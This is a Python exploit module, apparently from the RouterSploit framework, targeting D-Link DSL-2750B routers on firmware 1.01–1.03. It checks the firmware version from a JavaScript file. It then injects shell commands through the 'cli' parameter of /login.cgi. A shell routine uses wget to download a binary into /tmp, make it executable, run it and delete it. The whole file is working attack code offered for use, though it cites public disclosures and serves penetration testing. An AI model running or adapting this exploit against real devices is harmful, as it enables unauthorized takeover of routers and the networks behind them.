import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "D-Link DSL-2750B RCE",
        "description": "Module exploits remote code execution vulnerability in D-Link DSL-2750B devices. ",
        "authors": (
            "p@ql",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module,
        ),
        "references": (
            "http://seclists.org/fulldisclosure/2016/Feb/53",
            "https://packetstormsecurity.com/files/135706/dlinkdsl2750b-exec.txt",
        ),
        "devices": (
            "D-Link DSL-2750B",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable")
            shell(self, architecture="mipsbe", method="wget", location="/tmp", exec_binary="chmod 777 {0} && {0} && rm {0}")

    def execute(self, cmd):
        path = "/login.cgi?cli=multilingual show';{}'$".format(cmd)
        self.http_request(
            method="GET",
            path=path
        )

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/ayefeaturesconvert.js"
        )

        if response and "DSL-2750B" in response.text:
            version = re.findall(r"AYECOM_FWVER=\"(.*?)\";", response.text)
            if version:
                if utils.Version("1.01") <= utils.Version(version[0]) <= utils.Version("1.03"):
                    return True  # target is vulnerable

        return False  # target is not vulnerable
